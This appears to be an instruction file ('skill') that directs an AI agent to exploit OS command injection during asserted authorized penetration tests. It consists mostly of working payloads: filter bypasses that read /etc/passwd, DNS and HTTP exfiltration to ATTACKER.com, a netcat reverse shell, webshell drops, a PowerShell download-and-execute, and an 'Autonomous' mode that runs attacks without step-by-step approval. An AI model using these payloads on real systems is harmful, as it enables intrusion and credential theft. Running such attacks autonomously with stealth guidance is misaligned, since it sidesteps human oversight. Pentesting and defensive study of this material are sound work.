---
name: command-injection
description: >
  Guide OS command injection exploitation during authorized penetration testing.
  Use when the user has found an input that gets passed to a system shell command,
  or when testing for command injection in web applications, APIs, or network
  services. Also triggers on: "command injection", "OS injection", "RCE via shell",
  "shell injection", "system() injection", "exec() injection", "ping injection",
  "backtick injection", "command execution", "blind command injection", "argument
  injection", "parameter injection". OPSEC: medium — commands execute server-side,
  visible in process lists and application logs. Tools: burpsuite, commix,
  interactsh.
  Do NOT use for SQL injection — use sql-injection-* skills instead. Do NOT use
  for SSTI — use ssti-* skills instead. Do NOT use for file inclusion — use lfi
  instead.
---

# OS Command Injection

You are helping a penetration tester exploit OS command injection. The target
application passes user-controlled input to a system shell command without proper
sanitization. The goal is to execute arbitrary commands on the underlying
operating system. All testing is under explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Auto-detect platform, test operators
  systematically, identify working bypass, demonstrate impact. Report at
  milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (injection
  confirmed, filter bypass found, blind exfiltration working, pivot to another
  skill):
  `### [HH:MM] command-injection → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `cmdi-whoami-output.txt`, `cmdi-reverse-shell.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

After completing this technique or at significant milestones, update
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- An input that gets processed by a system command (URL param, form field, header,
  filename, API parameter)
- Common vulnerable patterns: ping/traceroute utilities, DNS lookups, file
  operations, PDF generators, image processors, email sending, network tools

## Step 1: Assess

If not already provided, determine:
1. **Platform** — Linux or Windows (try both `id` and `whoami`)
2. **Injection context** — unquoted, single-quoted, double-quoted, or backtick
3. **Injection point** — which parameter, GET/POST/header/filename
4. **Visible or blind** — is command output reflected in the response?

Skip if context was already provided.

## Step 2: Injection Operators

Try these operators to chain a second command. Test with a known-output command
(`id` on Linux, `whoami` on Windows) or a time delay (`sleep 5`, `ping -c 5
127.0.0.1`).

### Linux

| Payload | Behavior |
|---|---|
| `; id` | Sequential execution (always runs) |
| `| id` | Pipe — runs `id`, shows its output |
| `|| id` | Runs `id` only if first command fails |
| `&& id` | Runs `id` only if first command succeeds |
| `& id` | Background first command, run `id` |
| `` `id` `` | Command substitution (backticks) |
| `$(id)` | Command substitution (modern) |
| `%0a id` | Newline injection |

### Windows

| Payload | Behavior |
|---|---|
| `& whoami` | Run both commands |
| `&& whoami` | Run `whoami` if first succeeds |
| `|| whoami` | Run `whoami` if first fails |
| `| whoami` | Pipe output |
| `%0a whoami` | Newline injection |
| `%1a whoami` | Substitute character (sometimes works) |

### Context-Aware Injection

If the input is placed inside quotes in the shell command:

```bash
# Inside double quotes — break out:
"; id; echo "
" | id; echo "
"$(id)"

# Inside single quotes — cannot use $() or backticks:
'; id; echo '

# Inside backticks — close and inject:
`; id; echo `
```

### Polyglot Payloads

Work across multiple quoting contexts (unquoted, single-quoted, double-quoted):

```bash
# Time-based polyglot
1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}

# Comprehensive polyglot
/*$(sleep 5)`sleep 5``*/-sleep(5)-'/*$(sleep 5)`sleep 5` #*/-sleep(5)||'"||sleep(5)||"/*`*/
```

## Step 3: Filter Bypass

### Bypass Space Filters

```bash
# ${IFS} — most reliable
cat${IFS}/etc/passwd
ls${IFS}-la

# Brace expansion
{cat,/etc/passwd}
{ls,-la,/tmp}

# Tab character (URL-encode as %09)
;cat%09/etc/passwd

# Input redirection
cat</etc/passwd

# ANSI-C quoting
X=$'cat\x20/etc/passwd'&&$X
```

### Bypass Command Blacklists

```bash
# Quote splitting — insert empty quotes anywhere in the command
w'h'o'am'i
w"h"o"am"i
/b'i'n/c'a't /e't'c/p'a's's'w'd

# Backslash escaping
w\ho\am\i
c\at /e\tc/p\as\sw\d
/\b\i\n/\s\h

# Empty variable expansion
who$@ami
who${x}ami
cat$u /etc$u/passwd$u

# Empty command substitution
who$()ami
who``ami

# Variable concatenation
a=who;b=ami;$a$b
a=c;b=at;c=/etc/passwd;$a$b $c
```

### Bypass Character Restrictions

```bash
# Hex encoding
cat `echo -e "\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"`
X=$'\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64';cat $X

# Octal encoding
cat `printf '\57\145\164\143\57\160\141\163\163\167\144'`

# xxd for hex decoding
cat `xxd -r -ps <(echo 2f6574632f706173737764)`

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | sh
$(echo Y2F0IC9ldGMvcGFzc3dk | base64 -d)

# Build slash from env variable
cat ${HOME:0:1}etc${HOME:0:1}passwd
cat ${PATH:0:1}etc${PATH:0:1}passwd
```

### Wildcard-Based Bypass

When specific commands or paths are blacklisted:

```bash
# /bin/cat /etc/passwd via wildcards
/???/??t /???/p??s??

# /bin/nc with wildcard
/???/n? -e /???/s? attacker.com 4444

# Globbing alternatives
/bi[n]/cat /etc/pa[s]swd
/bin/ca? /etc/passw?
```

### Newline and Whitespace Injection

```bash
# URL-encoded newline (most commonly missed by filters)
%0aid
%0awhoami

# CRLF
%0d%0aid

# Backslash-newline continuation (split command across lines)
cat /et\
c/pa\
sswd
# URL-encoded: cat%20/et%5C%0Ac/pa%5C%0Asswd
```

## Step 4: Blind Command Injection

When command output is not reflected in the response.

### Time-Based Detection

```bash
# Linux
; sleep 5
| sleep 5
& sleep 5
`sleep 5`
$(sleep 5)

# Windows
& ping -n 6 127.0.0.1 &
& timeout /t 5 &

# With ${IFS} for space bypass
;sleep${IFS}5
```

If a 5-second delay is observed, injection is confirmed.

### Time-Based Data Exfiltration

Extract data character by character using conditional sleeps:

```bash
# Extract first character of whoami output
if [ $(whoami | cut -c 1) == "r" ]; then sleep 5; fi

# Extract Nth character
if [ $(whoami | cut -c 2) == "o" ]; then sleep 5; fi

# Binary search for faster extraction
if [ $(cat /etc/passwd | head -1 | cut -c 1 | od -An -td1 | tr -d ' ') -gt 100 ]; then sleep 5; fi
```

### DNS-Based Exfiltration (OOB)

Faster than time-based. Requires a DNS callback server (interactsh,
Burp Collaborator, dnsbin.zhack.ca).

```bash
# Exfiltrate command output via DNS
$(host $(whoami).ATTACKER.com)
$(dig $(whoami).ATTACKER.com)
$(ping -c1 $(whoami).ATTACKER.com)

# Exfiltrate file listing
for i in $(ls /); do host "$i.ATTACKER.com"; done

# Exfiltrate file contents (base32 to avoid DNS char restrictions)
$(cat /etc/hostname | base32 | tr -d '=' | nslookup -.ATTACKER.com)

# curl/wget OOB
$(curl http://ATTACKER.com/$(whoami))
$(wget http://ATTACKER.com/$(id|base64) -O /dev/null)
```

### File-Based Exfiltration

Write output to a web-accessible file:

```bash
# Write to webroot
; id > /var/www/html/output.txt
; cat /etc/passwd > /var/www/html/out.txt

# Then retrieve via HTTP
curl http://TARGET/output.txt
```

## Step 5: Argument Injection

When shell metacharacters (`;`, `|`, etc.) are properly escaped but the input is
used as an argument to a program. Inject flags/options instead.

### Common Vectors

```bash
# curl — write to arbitrary file
--output /tmp/shell.php -O http://attacker.com/shell.php

# wget — write to arbitrary file
-O /tmp/shell.php http://attacker.com/shell.php

# ssh — proxy command execution
-oProxyCommand="id > /tmp/proof"

# tar — checkpoint action
--checkpoint=1 --checkpoint-action=exec=id

# find — exec action (if input is used in -name or -path)
-name "x" -exec id \;

# rsync — script execution
-e 'sh -c id' .

# sendmail — write to file
-OQueueDirectory=/tmp -X/var/www/html/shell.php
```

### Fullwidth Character Bypass

Some sanitization functions (PHP `escapeshellarg`) can be bypassed with Unicode
fullwidth characters that get normalized by the shell:

```
＂ --use-askpass=calc ＂    # U+FF02 instead of regular double quote
```

## Step 6: Windows-Specific Techniques

### Case Insensitivity

Windows commands are case-insensitive — use case randomization to bypass filters:

```cmd
WhOaMi
wHoAmI
```

### Variable Substring Bypass

```cmd
# Space from environment variable
ping%CommonProgramFiles:~10,-18%127.0.0.1

# Build commands from substrings
set a=who&set b=ami&call %a%%b%
```

### PowerShell Injection

```powershell
# If input reaches PowerShell
; Invoke-Expression "whoami"
| IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER/payload.ps1')
```

### Caret Escaping

Windows `cmd.exe` treats `^` as an escape character:

```cmd
w^h^o^a^m^i
n^e^t u^s^e^r
```

## Step 7: Escalate or Pivot

- **Got command execution**: Establish reverse shell, route to privilege
  escalation
- **Blind only**: Use OOB exfiltration to extract credentials, SSH keys, or
  cloud tokens, then pivot directly
- **Got file read via command**: Extract application config files, database
  credentials, API keys
- **Found additional web vulns** during exploitation: Route to **sql-injection-error**,
  **lfi**, **ssrf**, etc.
- **Windows target**: Route to Windows privilege escalation
- **Linux target**: Route to Linux privilege escalation

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: confirmed platform, working injection operator, bypass
technique used, blind vs visible output, current mode.

## OPSEC Notes

- Commands execute as OS processes — visible in `ps`, `/proc`, process monitors
- Shell operators (`;`, `|`, `&&`) appear in web server access logs
- DNS exfiltration generates DNS queries visible to network monitoring
- Time-based payloads (`sleep`) are slow but stealthy
- `%0a` (newline) injection is less commonly filtered and logged than `;` or `|`
- Long-running commands may trigger process monitoring alerts — use `nohup` and
  background with `&`
- Cleanup: remove any files written to disk (webshells, output files)

## Troubleshooting

### No Operator Works

- Try all operators systematically: `;`, `|`, `||`, `&&`, `&`, `%0a`, `$(...)`,
  backticks
- Check if you're inside quotes — break out first (`"`, `'`)
- Try URL-encoded newline `%0a` — most commonly missed by filters
- Check for argument injection instead (inject flags, not commands)
- The application may not use a shell at all (e.g., `execFile()` in Node.js
  instead of `exec()`) — argument injection is the only option

### Space Is Filtered

Priority order:
1. `${IFS}` — works in bash/sh, most reliable
2. `%09` (tab) — works in most shells
3. `{command,arg1,arg2}` — brace expansion (bash only)
4. `<` (input redirection) — for file reading
5. `$'\x20'` — ANSI-C quoting

### Command Name Is Blacklisted

Priority order:
1. Quote splitting: `c'a't`, `w"h"o"a"m"i"`
2. Backslash: `c\at`, `w\hoam\i`
3. Variable expansion: `a=c;b=at;$a$b`
4. Wildcards: `/???/??t` matches `/bin/cat`
5. Base64: `echo Y2F0 | base64 -d` → `cat`
6. Hex: `echo -e "\x63\x61\x74"` → `cat`

### Blind Injection — Can't Confirm

1. Start with time-based: `; sleep 5` — compare response times
2. If `sleep` is blocked, try `ping -c 5 127.0.0.1` (5-second delay)
3. If time-based is unreliable, use OOB: `$(curl http://ATTACKER/test)`
4. If no outbound HTTP, try DNS: `$(host test.ATTACKER.com)`
5. If completely isolated, try file write: `; id > /tmp/test.txt` and include
   via LFI

### Automated Tools

```bash
# commix — automated command injection
python commix.py -u "http://TARGET/page?ip=127.0.0.1" --batch

# commix with POST data
python commix.py -u "http://TARGET/page" --data="ip=127.0.0.1" --batch

# commix OS shell
python commix.py -u "http://TARGET/page?ip=127.0.0.1" --os-shell

# With specific technique
python commix.py -u "http://TARGET/page?ip=127.0.0.1" -t time-based
```
